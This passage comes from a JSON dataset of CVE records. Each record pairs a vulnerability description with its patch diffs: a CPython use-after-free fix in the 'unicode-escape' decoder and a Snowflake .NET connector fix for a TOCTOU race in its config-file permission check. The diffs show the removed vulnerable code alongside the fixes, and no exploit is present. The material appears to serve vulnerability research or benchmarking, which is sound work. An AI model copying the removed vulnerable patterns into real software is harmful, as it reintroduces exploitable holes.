escape sequence')\n+        check(br'\\x3z5', '\\u0404\\\\z5', r'\"\\z\" is an invalid escape sequence')\n+        check(memoryview(br'\\x3z5x')[:-1], '\\u0404\\\\z5', r'\"\\z\" is an invalid escape sequence')\n+        check(memoryview(br'\\x3z5xy')[:-2], '\\u0404\\\\z5', r'\"\\z\" is an invalid escape sequence')\n+\n+        check(br'\\x5n\\z', '\\u0404\\n\\\\z', r'\"\\z\" is an invalid escape sequence')\n+        check(br'\\x5n\\501', '\\u0404\\n\\u0141', r'\"\\501\" is an invalid octal escape sequence')\n+        check(br'\\x5z', '\\u0404\\\\z', r'\"\\z\" is an invalid escape sequence')\n+        check(memoryview(br'\\x5zy')[:-1], '\\u0404\\\\z', r'\"\\z\" is an invalid escape sequence')\n+\n     # issue32583\n     def test_crashing_decode_handler(self):\n         # better generating one more character to fill the extra space slot\n```\n\nFilename: Lib/test/test_codecs.py:\n```\n@@ -1196,23 +1196,39 @@\ndef test_escape(self):\n         check(br\"[\\1010]\", b\"[A0]\")\n         check(br\"[\\x41]\", b\"[A]\")\n         check(br\"[\\x410]\", b\"[A0]\")\n+\n+    def test_warnings(self):\n+        decode = codecs.escape_decode\n+        check = coding_checker(self, decode)\n         for i in range(97, 123):\n             b = bytes([i])\n             if b not in b'abfnrtvx':\n-                with self.assertWarns(DeprecationWarning):\n+                with self.assertWarnsRegex(DeprecationWarning,\n+                        r'\"\\\\%c\" is an invalid escape sequence' % i):\n                     check(b\"\\\\\" + b, b\"\\\\\" + b)\n-            with self.assertWarns(DeprecationWarning):\n+            with self.assertWarnsRegex(DeprecationWarning,\n+                    r'\"\\\\%c\" is an invalid escape sequence' % (i-32)):\n                 check(b\"\\\\\" + b.upper(), b\"\\\\\" + b.upper())\n-        with self.assertWarns(DeprecationWarning):\n+        with self.assertWarnsRegex(DeprecationWarning,\n+                r'\"\\\\8\" is an invalid escape sequence'):\n             check(br\"\\8\", b\"\\\\8\")\n         with self.assertWarns(DeprecationWarning):\n             check(br\"\\9\", b\"\\\\9\")\n-        with self.assertWarns(DeprecationWarning):\n+        with self.assertWarnsRegex(DeprecationWarning,\n+                r'\"\\\\\\xfa\" is an invalid escape sequence') as cm:\n             check(b\"\\\\\\xfa\", b\"\\\\\\xfa\")\n         for i in range(0o400, 0o1000):\n-            with self.assertWarns(DeprecationWarning):\n+            with self.assertWarnsRegex(DeprecationWarning,\n+                    r'\"\\\\%o\" is an invalid octal escape sequence' % i):\n                 check(rb'\\%o' % i, bytes([i & 0o377]))\n \n+        with self.assertWarnsRegex(DeprecationWarning,\n+                r'\"\\\\z\" is an invalid escape sequence'):\n+            self.assertEqual(decode(br'\\x\\z', 'ignore'), (b'\\\\z', 4))\n+        with self.assertWarnsRegex(DeprecationWarning,\n+                r'\"\\\\501\" is an invalid octal escape sequence'):\n+            self.assertEqual(decode(br'\\x\\501', 'ignore'), (b'A', 6))\n+\n     def test_errors(self):\n         decode = codecs.escape_decode\n         self.assertRaises(ValueError, decode, br\"\\x\")\n\n@@ -2661,24 +2677,40 @@\ndef test_escape_decode(self):\n         check(br\"[\\x410]\", \"[A0]\")\n         check(br\"\\u20ac\", \"\\u20ac\")\n         check(br\"\\U0001d120\", \"\\U0001d120\")\n+\n+    def test_decode_warnings(self):\n+        decode = codecs.unicode_escape_decode\n+        check = coding_checker(self, decode)\n         for i in range(97, 123):\n             b = bytes([i])\n             if b not in b'abfnrtuvx':\n-                with self.assertWarns(DeprecationWarning):\n+                with self.assertWarnsRegex(DeprecationWarning,\n+                        r'\"\\\\%c\" is an invalid escape sequence' % i):\n                     check(b\"\\\\\" + b, \"\\\\\" + chr(i))\n             if b.upper() not in b'UN':\n-                with self.assertWarns(DeprecationWarning):\n+                with self.assertWarnsRegex(DeprecationWarning,\n+                        r'\"\\\\%c\" is an invalid escape sequence' % (i-32)):\n                     check(b\"\\\\\" + b.upper(), \"\\\\\" + chr(i-32))\n-        with self.assertWarns(DeprecationWarning):\n+        with self.assertWarnsRegex(DeprecationWarning,\n+                r'\"\\\\8\" is an invalid escape sequence'):\n             check(br\"\\8\", \"\\\\8\")\n         with self.assertWarns(DeprecationWarning):\n             check(br\"\\9\", \"\\\\9\")\n-        with self.assertWarns(DeprecationWarning):\n+        with self.assertWarnsRegex(DeprecationWarning,\n+                r'\"\\\\\\xfa\" is an invalid escape sequence') as cm:\n             check(b\"\\\\\\xfa\", \"\\\\\\xfa\")\n         for i in range(0o400, 0o1000):\n-            with self.assertWarns(DeprecationWarning):\n+            with self.assertWarnsRegex(DeprecationWarning,\n+                    r'\"\\\\%o\" is an invalid octal escape sequence' % i):\n                 check(rb'\\%o' % i, chr(i))\n \n+        with self.assertWarnsRegex(DeprecationWarning,\n+                r'\"\\\\z\" is an invalid escape sequence'):\n+            self.assertEqual(decode(br'\\x\\z', 'ignore'), ('\\\\z', 4))\n+        with self.assertWarnsRegex(DeprecationWarning,\n+                r'\"\\\\501\" is an invalid octal escape sequence'):\n+            self.assertEqual(decode(br'\\x\\501', 'ignore'), ('\\u0141', 6))\n+\n     def test_decode_errors(self):\n         decode = codecs.unicode_escape_decode\n         for c, d in (b'x', 2), (b'u', 4), (b'U', 4):\n```\n\nFilename: Misc/NEWS.d/next/Security/2025-05-09-20-22-54.gh-issue-133767.kN2i3Q.rst:\n```\n@@ -0,0 +1,2 @@\n+Fix use-after-free in the \"unicode-escape\" decoder with a non-\"strict\" error\n+handler.\n```\n\nFilename: Objects/bytesobject.c:\n```\n@@ -1075,10 +1075,11 @@\n_PyBytes_FormatEx(const char *format, Py_ssize_t format_len,\n }\n \n /* Unescape a backslash-escaped string. */\n-PyObject *_PyBytes_DecodeEscape(const char *s,\n+PyObject *_PyBytes_DecodeEscape2(const char *s,\n                                 Py_ssize_t len,\n                                 const char *errors,\n-                                const char **first_invalid_escape)\n+                                int *first_invalid_escape_char,\n+                                const char **first_invalid_escape_ptr)\n {\n     int c;\n     char *p;\n\n@@ -1092,7 +1093,8 @@\nPyObject *_PyBytes_DecodeEscape(const char *s,\n         return NULL;\n     writer.overallocate = 1;\n \n-    *first_invalid_escape = NULL;\n+    *first_invalid_escape_char = -1;\n+    *first_invalid_escape_ptr = NULL;\n \n     end = s + len;\n     while (s < end) {\n\n@@ -1130,9 +1132,10 @@\nPyObject *_PyBytes_DecodeEscape(const char *s,\n                     c = (c<<3) + *s++ - '0';\n             }\n             if (c > 0377) {\n-                if (*first_invalid_escape == NULL) {\n-                    *first_invalid_escape = s-3; /* Back up 3 chars, since we've\n-                                                    already incremented s. */\n+                if (*first_invalid_escape_char == -1) {\n+                    *first_invalid_escape_char = c;\n+                    /* Back up 3 chars, since we've already incremented s. */\n+                    *first_invalid_escape_ptr = s - 3;\n                 }\n             }\n             *p++ = c;\n\n@@ -1173,9 +1176,10 @@\nPyObject *_PyBytes_DecodeEscape(const char *s,\n             break;\n \n         default:\n-            if (*first_invalid_escape == NULL) {\n-                *first_invalid_escape = s-1; /* Back up one char, since we've\n-                                                already incremented s. */\n+            if (*first_invalid_escape_char == -1) {\n+                *first_invalid_escape_char = (unsigned char)s[-1];\n+                /* Back up one char, since we've already incremented s. */\n+                *first_invalid_escape_ptr = s - 1;\n             }\n             *p++ = '\\\\';\n             s--;\n\n@@ -1195,18 +1199,19 @@\nPyObject *PyBytes_DecodeEscape(const char *s,\n                                 Py_ssize_t Py_UNUSED(unicode),\n                                 const char *Py_UNUSED(recode_encoding))\n {\n-    const char* first_invalid_escape;\n-    PyObject *result = _PyBytes_DecodeEscape(s, len, errors,\n-                                             &first_invalid_escape);\n+    int first_invalid_escape_char;\n+    const char *first_invalid_escape_ptr;\n+    PyObject *result = _PyBytes_DecodeEscape2(s, len, errors,\n+                                             &first_invalid_escape_char,\n+                                             &first_invalid_escape_ptr);\n     if (result == NULL)\n         return NULL;\n-    if (first_invalid_escape != NULL) {\n-        unsigned char c = *first_invalid_escape;\n-        if ('4' <= c && c <= '7') {\n+    if (first_invalid_escape_char != -1) {\n+        if (first_invalid_escape_char > 0xff) {\n             if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,\n-                                 \"b\\\"\\\\%.3s\\\" is an invalid octal escape sequence. \"\n+                                 \"b\\\"\\\\%o\\\" is an invalid octal escape sequence. \"\n                                  \"Such sequences will not work in the future. \",\n-                                 first_invalid_escape) < 0)\n+                                 first_invalid_escape_char) < 0)\n             {\n                 Py_DECREF(result);\n                 return NULL;\n\n@@ -1216,7 +1221,7 @@\nPyObject *PyBytes_DecodeEscape(const char *s,\n             if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,\n                                  \"b\\\"\\\\%c\\\" is an invalid escape sequence. \"\n                                  \"Such sequences will not work in the future. \",\n-                                 c) < 0)\n+                                 first_invalid_escape_char) < 0)\n             {\n                 Py_DECREF(result);\n                 return NULL;\n```\n\nFilename: Objects/unicodeobject.c:\n```\n@@ -6596,21 +6596,24 @@\n_PyUnicode_GetNameCAPI(void)\n /* --- Unicode Escape Codec ----------------------------------------------- */\n \n PyObject *\n-_PyUnicode_DecodeUnicodeEscapeInternal(const char *s,\n+_PyUnicode_DecodeUnicodeEscapeInternal2(const char *s,\n                                Py_ssize_t size,\n                                const char *errors,\n                                Py_ssize_t *consumed,\n-                               const char **first_invalid_escape)\n+                               int *first_invalid_escape_char,\n+                               const char **first_invalid_escape_ptr)\n {\n     const char *starts = s;\n+    const char *initial_starts = starts;\n     _PyUnicodeWriter writer;\n     const char *end;\n     PyObject *errorHandler = NULL;\n     PyObject *exc = NULL;\n     _PyUnicode_Name_CAPI *ucnhash_capi;\n \n     // so we can remember if we've seen an invalid escape char or not\n-    *first_invalid_escape = NULL;\n+    *first_invalid_escape_char = -1;\n+    *first_invalid_escape_ptr = NULL;\n \n     if (size == 0) {\n         if (consumed) {\n\n@@ -6698,9 +6701,12 @@\n_PyUnicode_DecodeUnicodeEscapeInternal(const char *s,\n                 }\n             }\n             if (ch > 0377) {\n-                if (*first_invalid_escape == NULL) {\n-                    *first_invalid_escape = s-3; /* Back up 3 chars, since we've\n-                                                    already incremented s. */\n+                if (*first_invalid_escape_char == -1) {\n+                    *first_invalid_escape_char = ch;\n+                    if (starts == initial_starts) {\n+                        /* Back up 3 chars, since we've already incremented s. */\n+                        *first_invalid_escape_ptr = s - 3;\n+                    }\n                 }\n             }\n             WRITE_CHAR(ch);\n\n@@ -6795,9 +6801,12 @@\n_PyUnicode_DecodeUnicodeEscapeInternal(const char *s,\n             goto error;\n \n         default:\n-            if (*first_invalid_escape == NULL) {\n-                *first_invalid_escape = s-1; /* Back up one char, since we've\n-                                                already incremented s. */\n+            if (*first_invalid_escape_char == -1) {\n+                *first_invalid_escape_char = c;\n+                if (starts == initial_starts) {\n+                    /* Back up one char, since we've already incremented s. */\n+                    *first_invalid_escape_ptr = s - 1;\n+                }\n             }\n             WRITE_ASCII_CHAR('\\\\');\n             WRITE_CHAR(c);\n\n@@ -6842,19 +6851,20 @@\n_PyUnicode_DecodeUnicodeEscapeStateful(const char *s,\n                               const char *errors,\n                               Py_ssize_t *consumed)\n {\n-    const char *first_invalid_escape;\n-    PyObject *result = _PyUnicode_DecodeUnicodeEscapeInternal(s, size, errors,\n+    int first_invalid_escape_char;\n+    const char *first_invalid_escape_ptr;\n+    PyObject *result = _PyUnicode_DecodeUnicodeEscapeInternal2(s, size, errors,\n                                                       consumed,\n-                                                      &first_invalid_escape);\n+                                                      &first_invalid_escape_char,\n+                                                      &first_invalid_escape_ptr);\n     if (result == NULL)\n         return NULL;\n-    if (first_invalid_escape != NULL) {\n-        unsigned char c = *first_invalid_escape;\n-        if ('4' <= c && c <= '7') {\n+    if (first_invalid_escape_char != -1) {\n+        if (first_invalid_escape_char > 0xff) {\n             if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,\n-                                 \"\\\"\\\\%.3s\\\" is an invalid octal escape sequence. \"\n+                                 \"\\\"\\\\%o\\\" is an invalid octal escape sequence. \"\n                                  \"Such sequences will not work in the future. \",\n-                                 first_invalid_escape) < 0)\n+                                 first_invalid_escape_char) < 0)\n             {\n                 Py_DECREF(result);\n                 return NULL;\n\n@@ -6864,7 +6874,7 @@\n_PyUnicode_DecodeUnicodeEscapeStateful(const char *s,\n             if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,\n                                  \"\\\"\\\\%c\\\" is an invalid escape sequence. \"\n                                  \"Such sequences will not work in the future. \",\n-                                 c) < 0)\n+                                 first_invalid_escape_char) < 0)\n             {\n                 Py_DECREF(result);\n                 return NULL;\n```\n\nFilename: Parser/string_parser.c:\n```\n@@ -196,15 +196,18 @@\ndecode_unicode_with_escapes(Parser *parser, const char *s, size_t len, Token *t)\n     len = (size_t)(p - buf);\n     s = buf;\n \n-    const char *first_invalid_escape;\n-    v = _PyUnicode_DecodeUnicodeEscapeInternal(s, (Py_ssize_t)len, NULL, NULL, &first_invalid_escape);\n+    int first_invalid_escape_char;\n+    const char *first_invalid_escape_ptr;\n+    v = _PyUnicode_DecodeUnicodeEscapeInternal2(s, (Py_ssize_t)len, NULL, NULL,\n+                                                &first_invalid_escape_char,\n+                                                &first_invalid_escape_ptr);\n \n     // HACK: later we can simply pass the line no, since we don't preserve the tokens\n     // when we are decoding the string but we preserve the line numbers.\n-    if (v != NULL && first_invalid_escape != NULL && t != NULL) {\n-        if (warn_invalid_escape_sequence(parser, s, first_invalid_escape, t) < 0) {\n-            /* We have not decref u before because first_invalid_escape points\n-               inside u. */\n+    if (v != NULL && first_invalid_escape_ptr != NULL && t != NULL) {\n+        if (warn_invalid_escape_sequence(parser, s, first_invalid_escape_ptr, t) < 0) {\n+            /* We have not decref u before because first_invalid_escape_ptr\n+               points inside u. */\n             Py_XDECREF(u);\n             Py_DECREF(v);\n             return NULL;\n\n@@ -217,14 +220,17 @@\ndecode_unicode_with_escapes(Parser *parser, const char *s, size_t len, Token *t)\n static PyObject *\n decode_bytes_with_escapes(Parser *p, const char *s, Py_ssize_t len, Token *t)\n {\n-    const char *first_invalid_escape;\n-    PyObject *result = _PyBytes_DecodeEscape(s, len, NULL, &first_invalid_escape);\n+    int first_invalid_escape_char;\n+    const char *first_invalid_escape_ptr;\n+    PyObject *result = _PyBytes_DecodeEscape2(s, len, NULL,\n+                                              &first_invalid_escape_char,\n+                                              &first_invalid_escape_ptr);\n     if (result == NULL) {\n         return NULL;\n     }\n \n-    if (first_invalid_escape != NULL) {\n-        if (warn_invalid_escape_sequence(p, s, first_invalid_escape, t) < 0) {\n+    if (first_invalid_escape_ptr != NULL) {\n+        if (warn_invalid_escape_sequence(p, s, first_invalid_escape_ptr, t) < 0) {\n             Py_DECREF(result);\n             return NULL;\n         }\n```",
                "url": "https://github.com/python/cpython/commit/9f69a58623bd01349a18ba0c7a9cb1dad6a51e8e"
            }
        ],
        "published_date": "2025-05-15T13:29:20.126Z",
        "sec_adv": [],
        "sw_version": "v3.14.0a7",
        "sw_version_wget": "https://github.com/python/cpython/archive/refs/tags/v3.14.0a7.zip"
    },
    "CVE-2025-46326": {
        "cwe": [
            {
                "id": "CWE-367",
                "value": "CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition"
            }
        ],
        "description": "snowflake-connector-net is the Snowflake Connector for .NET. Versions starting from 2.1.2 to before 4.4.1, are vulnerable to a Time-of-Check to Time-of-Use (TOCTOU) race condition. When using the Easy Logging feature on Linux and macOS, the Connector reads logging configuration from a user-provided file. On Linux and macOS, the Connector verifies that the configuration file can be written to only by its owner. That check was vulnerable to a TOCTOU race condition and failed to verify that the file owner matches the user running the Connector. This could allow a local attacker with write access to the configuration file or the directory containing it to overwrite the configuration and gain control over logging level and output location. This issue has been patched in version 4.4.1.",
        "languages": [
            "C#"
        ],
        "patch_commits": [
            {
                "content": "SNOW-1156046: Fix race condition with easy logging config (#1156)\n\nCo-authored-by: sfc-gh-ext-simba-lf <115584722+sfc-gh-ext-simba-lf@users.noreply.github.com>\n\nFilename: Snowflake.Data.Tests/Mock/MockUnixOperations.cs:\n```\n@@ -16,7 +16,7 @@\npublic override bool CheckDirectoryHasAnyOfPermissions(string path, FileAccessPe\n             return DirectoryPermissionsReturn;\n         }\n \n-        public override bool CheckFileHasAnyOfPermissions(string path, FileAccessPermissions permissions)\n+        public override bool CheckFileHasAnyOfPermissions(FileAccessPermissions actualPermissions , FileAccessPermissions expectedPermissions)\n         {\n             return FilePermissionsReturn;\n         }\n```\n\nFilename: Snowflake.Data.Tests/UnitTests/Configuration/EasyLoggingConfigFinderTest.cs:\n```\n@@ -1,7 +1,5 @@\nusing System;\n using System.IO;\n-using System.Runtime.InteropServices;\n-using Mono.Unix;\n using Moq;\n using NUnit.Framework;\n using Snowflake.Data.Configuration;\n\n@@ -22,9 +20,6 @@\npublic class EasyLoggingConfigFinderTest\n         [ThreadStatic]\n         private static Mock<FileOperations> t_fileOperations;\n \n-        [ThreadStatic]\n-        private static Mock<UnixOperations> t_unixOperations;\n-\n         [ThreadStatic]\n         private static Mock<EnvironmentOperations> t_environmentOperations;\n\n@@ -35,9 +30,8 @@\npublic class EasyLoggingConfigFinderTest\n         public void Setup()\n         {\n             t_fileOperations = new Mock<FileOperations>();\n-            t_unixOperations = new Mock<UnixOperations>();\n             t_environmentOperations = new Mock<EnvironmentOperations>();\n-            t_finder = new EasyLoggingConfigFinder(t_fileOperations.Object, t_unixOperations.Object, t_environmentOperations.Object);\n+            t_finder = new EasyLoggingConfigFinder(t_fileOperations.Object, t_environmentOperations.Object);\n             MockHomeDirectory();\n             MockExecutionDirectory();\n         }\n\n@@ -115,26 +109,6 @@\npublic void TestThatTakesFilePathFromHomeDirectoryWhenNoOtherWaysPossible()\n             Assert.AreEqual(s_homeConfigFilePath, filePath);\n         }\n \n-        [Test]\n-        public void TestThatConfigFileIsNotUsedIfOthersCanModifyTheConfigFile()\n-        {\n-            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))\n-            {\n-                Assert.Ignore(\"skip test on Windows\");\n-            }\n-\n-            // arrange\n-            MockFileOnHomePath();\n-            MockHasFlagReturnsTrue();\n-\n-            // act\n-            var thrown = Assert.Throws<Exception>(() => t_finder.FindConfigFilePath(null));\n-\n-            // assert\n-            Assert.IsNotNull(thrown);\n-            Assert.AreEqual(thrown.Message, $\"Error due to other users having permission to modify the config file: {s_homeConfigFilePath}\");\n-        }\n-\n         [Test]\n         public void TestThatReturnsNullIfNoWayOfGettingTheFile()\n         {\n\n@@ -188,14 +162,6 @@\npublic void TestThatDoesNotFailWhenHomeDirectoryDoesNotExist()\n             t_environmentOperations.Verify(e => e.GetFolderPath(Environment.SpecialFolder.UserProfile), Times.Once);\n         }\n \n-        private static void MockHasFlagReturnsTrue()\n-        {\n-            t_unixOperations\n-                .Setup(f => f.CheckFileHasAnyOfPermissions(s_homeConfigFilePath,\n-                    It.Is<FileAccessPermissions>(p =>  p.Equals(FileAccessPermissions.GroupWrite | FileAccessPermissions.OtherWrite))))\n-                .Returns(true);\n-        }\n-\n         private static void MockHomeDirectory()\n         {\n             t_environmentOperations\n```\n\nFilename: Snowflake.Data.Tests/UnitTests/Configuration/EasyLoggingConfigParserTest.cs:\n```\n@@ -1,8 +1,11 @@\nusing System;\n using System.Collections.Generic;\n using System.IO;\n+using Mono.Unix;\n+using Moq;\n using NUnit.Framework;\n using Snowflake.Data.Configuration;\n+using Snowflake.Data.Core.Tools;\n using static Snowflake.Data.Tests.UnitTests.Configuration.EasyLoggingConfigGenerator;\n \n namespace Snowflake.Data.Tests.UnitTests.Configuration\n\n@@ -89,7 +92,7 @@\npublic void TestThatFailsWhenTheFileDoesNotExist()\n             \n             // assert\n             Assert.IsNotNull(thrown);\n-            Assert.AreEqual(\"Finding easy logging configuration failed\", thrown.Message);\n+            Assert.IsTrue(thrown.Message.Contains(\"Finding easy logging configuration failed\"));\n         }\n \n         [Test, TestCaseSource(nameof(WrongConfigFiles))]\n\n@@ -102,7 +105,80 @@\npublic void TestThatFailsIfMissingOrInvalidRequiredFields(string filePath)\n             var thrown = Assert.Throws<Exception>(() => parser.Parse(filePath));\n             // assert\n             Assert.IsNotNull(thrown);\n-            Assert.IsTrue(thrown.Message == \"Parsing easy logging configuration failed\");\n+            Assert.AreEqual(thrown.Message, \"Parsing easy logging configuration failed\");\n+        }\n+\n+        [Test]\n+        [Platform(Exclude = \"Win\")]\n+        public void TestThatConfigFileIsNotUsedIfOthersCanModifyTheConfigFile()\n+        {\n+            // arrange\n+            var unixOperations = new Mock<UnixOperations>();\n+            var configFilePath = CreateConfigTempFile(s_workingDirectory, null);\n+            var stream = new UnixFileInfo(configFilePath).OpenRead();\n+            var parser = new EasyLoggingConfigParser(unixOperations.Object);\n+            unixOperations\n+                .Setup(u => u.CheckFileHasAnyOfPermissions(stream.FileAccessPermissions,\n+                    It.Is<FileAccessPermissions>(p => p.Equals(FileAccessPermissions.GroupWrite | FileAccessPermissions.OtherWrite))))\n+                .Returns(true);\n+            unixOperations\n+                .Setup(u => u.GetCurrentUserId())\n+                .Returns(stream.OwnerUserId);\n+            unixOperations\n+                .Setup(u => u.GetCurrentGroupId())\n+                .Returns(stream.OwnerGroupId);\n+\n+            // act\n+            var thrown = Assert.Throws<Exception>(() => parser.Parse(configFilePath));\n+\n+            // assert\n+            Assert.IsNotNull(thrown);\n+            Assert.AreEqual(thrown.Message, \"Finding easy logging configuration failed: Error due to other users having permission to modify the config file\");\n+        }\n+\n+        [Test]\n+        [Platform(Exclude = \"Win\")]\n+        public void TestThatConfigFileIsNotUsedIfUserDoesNotOwnConfigFile()\n+        {\n+            // arrange\n+            var unixOperations = new Mock<UnixOperations>();\n+            var configFilePath = CreateConfigTempFile(s_workingDirectory, null);\n+            var stream = new UnixFileInfo(configFilePath).OpenRead();\n+            var parser = new EasyLoggingConfigParser(unixOperations.Object);\n+            unixOperations\n+                .Setup(u => u.GetCurrentUserId())\n+                .Returns(stream.OwnerUserId - 1);\n+\n+            // act\n+            var thrown = Assert.Throws<Exception>(() => parser.Parse(configFilePath));\n+\n+            // assert\n+            Assert.IsNotNull(thrown);\n+            Assert.AreEqual(thrown.Message, \"Finding easy logging configuration failed: Error due to user not having ownership of the config file\");\n+        }\n+\n+        [Test]\n+        [Platform(Exclude = \"Win\")]\n+        public void TestThatConfigFileIsNotUsedIfGroupDoesNotOwnConfigFile()\n+        {\n+            // arrange\n+            var unixOperations = new Mock<UnixOperations>();\n+            var configFilePath = CreateConfigTempFile(s_workingDirectory, null);\n+            var stream = new UnixFileInfo(configFilePath).OpenRead();\n+            var parser = new EasyLoggingConfigParser(unixOperations.Object);\n+            unixOperations\n+                .Setup(u => u.GetCurrentUserId())\n+                .Returns(stream.OwnerUserId);\n+            unixOperations\n+                .Setup(u => u.GetCurrentGroupId())\n+                .Returns(stream.OwnerGroupId - 1);\n+\n+            // act\n+            var thrown = Assert.Throws<Exception>(() => parser.Parse(configFilePath));\n+\n+            // assert\n+            Assert.IsNotNull(thrown);\n+            Assert.AreEqual(thrown.Message, \"Finding easy logging configuration failed: Error due to group not having ownership of the config file\");\n         }\n \n         public static IEnumerable<string> ConfigFilesWithoutValues()\n```\n\nFilename: Snowflake.Data.Tests/UnitTests/Tools/FileOperationsTest.cs:\n```\n@@ -155,11 +155,19 @@\npublic void TestFileIsNotSecureWhenNotOwnedByCurrentUser()\n         {\n             // arrange\n             var absolutePath = Path.Combine(s_workingDirectory, s_fileName);\n-            var mockUnixOperations = new MockUnixOperations{ CurrentUserId = 1, FileOwnerId = 2 };\n-            var fileOps = new FileOperations(mockUnixOperations);\n+            File.Create(absolutePath);\n+            try\n+            {\n+                var mockUnixOperations = new MockUnixOperations { CurrentUserId = 1, FileOwnerId = 2 };\n+                var fileOps = new FileOperations(mockUnixOperations);\n \n-            // act and assert\n-            Assert.IsFalse(fileOps.IsFileSafe(absolutePath));\n+                // act and assert\n+                Assert.IsFalse(fileOps.IsFileSafe(absolutePath));\n+            }\n+            finally\n+            {\n+                File.Delete(absolutePath);\n+            }\n         }\n \n         [Test]\n```\n\nFilename: Snowflake.Data.Tests/UnitTests/Tools/UnixOperationsTest.cs:\n```\n@@ -50,9 +50,10 @@\npublic void TestDetectGroupOrOthersWritablePermissions(\n             var readWriteUserPermissions = FileAccessPermissions.UserRead | FileAccessPermissions.UserWrite;\n             var filePermissions = readWriteUserPermissions | groupOrOthersWritablePermissions | groupNotWritablePermissions | otherNotWritablePermissions;\n             Syscall.chmod(filePath, (FilePermissions) filePermissions);\n+            var fileInfo = new UnixFileInfo(filePath);\n \n             // act\n-            var result = s_unixOperations.CheckFileHasAnyOfPermissions(filePath, FileAccessPermissions.GroupWrite | FileAccessPermissions.OtherWrite);\n+            var result = s_unixOperations.CheckFileHasAnyOfPermissions(fileInfo.FileAccessPermissions, FileAccessPermissions.GroupWrite | FileAccessPermissions.OtherWrite);\n \n             // assert\n             Assert.IsTrue(result);\n\n@@ -68,9 +69,10 @@\npublic void TestDetectGroupOrOthersNotWritablePermissions(\n             var filePath = CreateConfigTempFile(s_workingDirectory, \"random text\");\n             var filePermissions = userPermissions | groupNotWritablePermissions | otherNotWritablePermissions;\n             Syscall.chmod(filePath, (FilePermissions) filePermissions);\n+            var fileInfo = new UnixFileInfo(filePath);\n \n             // act\n-            var result = s_unixOperations.CheckFileHasAnyOfPermissions(filePath, FileAccessPermissions.GroupWrite | FileAccessPermissions.OtherWrite);\n+            var result = s_unixOperations.CheckFileHasAnyOfPermissions(fileInfo.FileAccessPermissions, FileAccessPermissions.GroupWrite | FileAccessPermissions.OtherWrite);\n \n             // assert\n             Assert.IsFalse(result);\n\n@@ -158,7 +160,8 @@\npublic void TestCreateFileWithUserRwPermissions()\n             s_unixOperations.CreateFileWithPermissions(filePath, FileAccessPermissions.UserRead | FileAccessPermissions.UserWrite);\n \n             // assert\n-            var result = s_unixOperations.CheckFileHasAnyOfPermissions(filePath, FileAccessPermissions.AllPermissions & ~(FileAccessPermissions.UserRead | FileAccessPermissions.UserWrite));\n+            var fileInfo = new UnixFileInfo(filePath);\n+            var result = s_unixOperations.CheckFileHasAnyOfPermissions(fileInfo.FileAccessPermissions, FileAccessPermissions.AllPermissions & ~(FileAccessPermissions.UserRead | FileAccessPermissions.UserWrite));\n             Assert.IsFalse(result);\n         }\n\n@@ -173,7 +176,8 @@\npublic void TestCreateDirectoryWithUserRwxPermissions()\n             s_unixOperations.CreateDirectoryWithPermissions(dirPath, FileAccessPermissions.UserReadWriteExecute);\n \n             // assert\n-            var result = s_unixOperations.CheckFileHasAnyOfPermissions(dirPath, FileAccessPermissions.AllPermissions & ~FileAccessPermissions.UserReadWriteExecute);\n+            var dirInfo = new UnixDirectoryInfo(dirPath);\n+            var result = s_unixOperations.CheckFileHasAnyOfPermissions(dirInfo.FileAccessPermissions, FileAccessPermissions.AllPermissions & ~FileAccessPermissions.UserReadWriteExecute);\n             Assert.IsFalse(result);\n         }\n\n@@ -186,7 +190,8 @@\npublic void TestNestedDir()\n             s_unixOperations.CreateDirectoryWithPermissions(dirPath, FileAccessPermissions.UserReadWriteExecute);\n \n             // act\n-            var result = s_unixOperations.CheckFileHasAnyOfPermissions(dirPath, FileAccessPermissions.AllPermissions & ~FileAccessPermissions.UserReadWriteExecute);\n+            var dirInfo = new UnixDirectoryInfo(dirPath);\n+            var result = s_unixOperations.CheckFileHasAnyOfPermissions(dirInfo.FileAccessPermissions, FileAccessPermissions.AllPermissions & ~FileAccessPermissions.UserReadWriteExecute);\n \n             // assert\n             Assert.IsFalse(result);\n```\n\nFilename: Snowflake.Data/Configuration/EasyLoggingConfigFinder.cs:\n```\n@@ -1,7 +1,5 @@\nusing System;\n using System.IO;\n-using System.Runtime.InteropServices;\n-using Mono.Unix;\n using Snowflake.Data.Core.Tools;\n using Snowflake.Data.Log;\n\n@@ -15,15 +13,13 @@\ninternal class EasyLoggingConfigFinder\n         internal const string ClientConfigEnvironmentName = \"SF_CLIENT_CONFIG_FILE\";\n \n         private readonly FileOperations _fileOperations;\n-        private readonly UnixOperations _unixOperations;\n         private readonly EnvironmentOperations _environmentOperations;\n         \n-        public static readonly EasyLoggingConfigFinder Instance = new EasyLoggingConfigFinder(FileOperations.Instance, UnixOperations.Instance, EnvironmentOperations.Instance);\n+        public static readonly EasyLoggingConfigFinder Instance = new EasyLoggingConfigFinder(FileOperations.Instance, EnvironmentOperations.Instance);\n \n-        internal EasyLoggingConfigFinder(FileOperations fileOperations, UnixOperations unixFileOperations, EnvironmentOperations environmentOperations)\n+        internal EasyLoggingConfigFinder(FileOperations fileOperations, EnvironmentOperations environmentOperations)\n         {\n             _fileOperations = fileOperations;\n-            _unixOperations = unixFileOperations;\n             _environmentOperations = environmentOperations;\n         }\n\n@@ -37,10 +33,6 @@\npublic virtual string FindConfigFilePath(string configFilePathFromConnectionStri\n                               ?? GetFilePathEnvironmentVariable()\n                               ?? GetFilePathFromDriverLocation()\n                               ?? GetFilePathFromHomeDirectory();\n-            if (configFilePath != null)\n-            {\n-                CheckIfValidPermissions(configFilePath);\n-            }\n             return configFilePath;\n         }\n\n@@ -96,19 +88,5 @@\nprivate string OnlyIfFileExists(string filePath, string directoryDescription)\n             }\n             return null;\n         }\n-\n-        private void CheckIfValidPermissions(string filePath)\n-        {\n-            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))\n-                return;\n-\n-            // Check if others have permissions to modify the file and fail if so\n-            if (_unixOperations.CheckFileHasAnyOfPermissions(filePath, FileAccessPermissions.GroupWrite | FileAccessPermissions.OtherWrite))\n-            {\n-                var errorMessage = $\"Error due to other users having permission to modify the config file: {filePath}\";\n-                s_logger.Error(errorMessage);\n-                throw new Exception(errorMessage);\n-            }\n-        }\n     }\n }\n```\n\nFilename: 